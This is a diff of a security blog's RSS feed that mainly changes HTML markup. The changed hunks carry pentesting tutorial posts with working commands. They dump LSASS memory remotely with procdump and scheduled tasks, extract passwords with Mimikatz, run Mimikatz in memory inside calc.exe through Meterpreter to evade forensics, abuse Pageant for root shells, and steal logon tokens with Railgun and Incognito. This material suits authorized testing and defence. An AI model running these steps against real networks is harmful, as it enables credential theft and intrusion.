@@ -61,29 +61,29 @@
 &lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
 dir \\TARGETBOX\C$
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;at \\TARGETBOX
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;at \\TARGETBOX
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
 dir \\TARGETBOX\C$\Temp
 copy c:\temp\procdump.exe \\TARGETBOXC$
 copy c:\temp\procdump.bat \\TARGETBOXC$
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;@echo off
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@echo off
 C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;
 &lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;net time \\TARGETBOX
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net time \\TARGETBOX
 at \\TARGETBOX 13:52 C:\Temp\procdump.bat
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
 copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
 rmdir /s \\TARGETBOX\C$\Temp
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
 Switch to MINIDUMP
 
 mimikatz # sekurlsa::logonPasswords full
@@ -126,7 +126,7 @@ mimikatz # sekurlsa::logonPasswords full
 &lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&#39; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
+&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
 </description>
@@ -225,7 +225,7 @@ mimikatz # sekurlsa::logonPasswords full
 &lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;
 &lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;
+&lt;p&gt;This module does the equivalent of &amp;rsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;
 &lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;
@@ -297,7 +297,7 @@ mimikatz # sekurlsa::logonPasswords full
 &lt;p&gt;If you&amp;rsquo;ve noticed that RHOST option, Metasploit has the ability to do remote registry calls as well (this module will attempt to start the RemoteRegistry service if the user has the privilege to do so):&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Output from it finding a disabled RemoteRegistry:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf post(enum_proxy) &amp;gt; run
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf post(enum_proxy) &amp;gt; run
 
 [-] Unable to contact remote registry service on 172.16.10.217
 [*] Attempting to start service remotely...
@@ -374,7 +374,7 @@ mimikatz # sekurlsa::logonPasswords full
 &lt;p&gt;Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job. And today, that&amp;rsquo;s now Mimikatz. &lt;/p&gt;
 &lt;p&gt;Just like WCE to execute it in memory you use the -m flag for execute:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;meterpreter&amp;gt; execute -H -i -c -m -d calc.exe -f mimikatz.exe -a &#39;&amp;quot;sekurlsa::logonPasswords full&amp;quot; exit&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;lsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;
+&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;rsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-)&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -392,8 +392,8 @@ mimikatz # sekurlsa::logonPasswords full
       
       <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
       <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
-[*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
+[*] Putty Installed for [[&amp;#34;Administrator&amp;#34;]]
 [*] Saved SSH Server Public Keys:
 [*]     rsa2@22:172.16.10.150
 [*] Session corp_webserver:
@@ -403,7 +403,7 @@ mimikatz # sekurlsa::logonPasswords full
 [*]     Public Key:
 meterpreter &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; shell
 Process 3364 created.
 Channel 1 created.
 Microsoft Windows XP [Version 5.1.2600]
@@ -438,11 +438,11 @@ uid=0(root) gid=0(root) groups=0(root)
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;
 &lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetStartupInfoW(&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lpStartupInfo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CreateProcessWithLogonW(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DOMAIN&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON_WITH_PROFILE&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;notepad.exe&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,a,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LogonUserA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DOMAIN&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON32_LOGON_INTERACTIVE&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON32_PROVIDER_DEFAULT&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetStartupInfoW(&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lpStartupInfo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CreateProcessWithLogonW(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DOMAIN&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON_WITH_PROFILE&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;notepad.exe&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,a,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LogonUserA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DOMAIN&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON32_LOGON_INTERACTIVE&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON32_PROVIDER_DEFAULT&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
 </description>
     </item>
     
